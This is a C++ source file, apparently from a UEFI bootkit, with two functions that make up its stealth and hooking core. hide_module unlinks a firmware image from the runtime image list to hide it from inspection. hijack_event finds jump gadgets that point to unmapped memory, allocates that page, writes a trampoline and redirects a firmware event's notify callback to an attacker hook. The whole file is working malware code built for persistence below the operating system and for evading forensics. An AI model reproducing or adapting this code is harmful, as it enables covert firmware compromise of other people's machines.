#include <bootkit/arch/x86/memory.hpp>
#include <bootkit/binary/heuristic.hpp>
#include <bootkit/binary/pe.hpp>
#include <bootkit/forensics/evasion.hpp>
#include <bootkit/general.hpp>
#include <bootkit/uefi_internals.hpp>

BOOLEAN hide_module(EFI_HANDLE image_handle, VOID *image_base)
{
  LIST_ENTRY *current;
  EFI_TPL tpl;
  BOOLEAN found;

  if (i::g_runtime == nullptr) {
    EFI_STATUS status;
    status = g::bs->LocateProtocol(&guid::runtime_arch_protocol, nullptr,
                                   reinterpret_cast<void **>(&i::g_runtime));
    if (status != EFI_SUCCESS || i::g_runtime == nullptr) {
      dbg::print(DEBUG_ERROR, "LocateProtocol failed for Runtime Arch Protocol in hide_module\r\n");
      return FALSE;
    }
  }

  if (i::g_runtime->ImageHead.ForwardLink == i::g_runtime->ImageHead.BackLink)
    return TRUE;

  tpl = g::bs->RaiseTPL(TPL_HIGH_LEVEL);

  found = FALSE;
  current = i::g_runtime->ImageHead.ForwardLink;
  for (; current != reinterpret_cast<EFI_LIST_ENTRY *>(&i::g_runtime->ImageHead);
       current = current->ForwardLink) {
    EFI_RUNTIME_IMAGE_ENTRY *img = BASE_CR(current, EFI_RUNTIME_IMAGE_ENTRY, Link);

    if (img->Handle == image_handle || (image_base != nullptr && img->ImageBase == image_base)) {
      EFI_RUNTIME_IMAGE_ENTRY *prev = BASE_CR(current->BackLink, EFI_RUNTIME_IMAGE_ENTRY, Link);
      EFI_RUNTIME_IMAGE_ENTRY *next = BASE_CR(current->ForwardLink, EFI_RUNTIME_IMAGE_ENTRY, Link);

      prev->Link.ForwardLink = img->Link.ForwardLink;
      next->Link.BackLink = img->Link.BackLink;

      found = TRUE;
    }
  }

  g::bs->RestoreTPL(tpl);

  if (!found)
    dbg::print(DEBUG_INFO, "Target module wasn't found in hide_module\r\n");

  return found;
}

void **hijack_event(UINT32 type, EFI_EVENT_NOTIFY hook, EFI_EVENT_NOTIFY *original)
{
  IEVENT *best_entry;
  uint8_t *gadget_address;
  EFI_PHYSICAL_ADDRESS efi_addr;
  uint8_t *c;
  EFI_STATUS status;
  uintptr_t dst;
  uintptr_t stub_addr;
  uint32_t best_distance;
  intptr_t off;

  best_entry = nullptr;
  gadget_address = nullptr;
  stub_addr = 0;
  best_distance = 0xFFFFFFFF;

  auto get_best_target = [&](IEVENT *current) -> BOOLEAN {
    uint8_t *c;
    uintptr_t callback_addr;
    uintptr_t module_base;
    uintptr_t code_section;
    uintptr_t code_size;
    BOOLEAN result;

    if (type != current->Type)
      return FALSE;

    callback_addr = reinterpret_cast<uintptr_t>(current->NotifyFunction);
    module_base = heuristic::retroactive_find_pe_base(callback_addr);
    if (!module_base)
      return FALSE;

    if (!pe::get_code_section(module_base, &code_section, &code_size))
      return FALSE;
    if (code_size < 5)
      return FALSE;

    result = FALSE;
    c = reinterpret_cast<uint8_t *>(code_section);
    for (uintptr_t i = 0; i < code_size - 5; i++) {
      if (c[i] == 0xe9 /* jmp near i32*/) {
        uintptr_t destination;
        uintptr_t insn_addr;
        uint32_t distance;
        int32_t jmp_rel32;

        insn_addr = reinterpret_cast<uintptr_t>(&c[i]);
        jmp_rel32 = *reinterpret_cast<int32_t *>(&c[i + 1]);
        destination = insn_addr + 5 + jmp_rel32;
        // we are looking for invalid jmps to unallocated memory
        if (pt::is_page_present(destination))
          continue;

        distance =
            (insn_addr > callback_addr) ? (insn_addr - callback_addr) : (callback_addr - insn_addr);
        if (distance > best_distance)
          continue;
        // at least 2 bytes whithin page for EB XX
        if ((destination & EFI_PAGE_MASK) > EFI_PAGE_SIZE - 2)
          continue;

        best_entry = current;
        gadget_address = &c[i];
        best_distance = distance;
        stub_addr = destination;
        result = TRUE;
      }
    }

    if (result) {
      dbg::print(DEBUG_INFO, "Best gadget for image: %p, distance %08lx\r\n", gadget_address,
                 best_distance);
    }

    return result;
  };

  if (iterate_events(get_best_target) == FALSE || stub_addr == 0 || gadget_address == nullptr) {
    dbg::print(DEBUG_ERROR, "Failed to get a gadget in hijack_event\r\n", stub_addr);
    return nullptr;
  }

  efi_addr = stub_addr;
  status = g::bs->AllocatePages(AllocateAddress, EfiRuntimeServicesCode, 1, &efi_addr);
  if (EFI_ERROR(status)) {
    dbg::print(DEBUG_ERROR, "Failed to get page %p in hijack_event (%Lx)\r\n",
               reinterpret_cast<void *>(stub_addr), status);
    return nullptr;
  }

  c = reinterpret_cast<uint8_t *>(stub_addr);
  if ((stub_addr & EFI_PAGE_MASK) > EFI_PAGE_SIZE - 32) {
    // jmp rel i8 -(15 + 15 + 2)
    c[0] = 0xeb;
    c[1] = 0xe0;
    c -= 30;
  }

  dst = reinterpret_cast<uintptr_t>(hook);
  off = static_cast<intptr_t>(dst) - (reinterpret_cast<uintptr_t>(c) + 5);
  if (off >= INT32_MIN && off <= INT32_MAX) {
    c[0] = 0xe9;
    *reinterpret_cast<int32_t *>(&c[1]) = static_cast<int32_t>(off);
  }
  else {
    c[0] = 0xFF;
    c[1] = 0x25;
    *reinterpret_cast<uint32_t *>(&c[2]) = 0;
    *reinterpret_cast<uintptr_t *>(&c[6]) = dst;
  }

  c = reinterpret_cast<uint8_t *>(gadget_address);
  *original = best_entry->NotifyFunction;
  best_entry->NotifyFunction = reinterpret_cast<EFI_EVENT_NOTIFY>(gadget_address);
  best_entry->RuntimeData.NotifyFunction = reinterpret_cast<EFI_EVENT_NOTIFY>(gadget_address);
  return reinterpret_cast<void **>(&best_entry->NotifyFunction);
}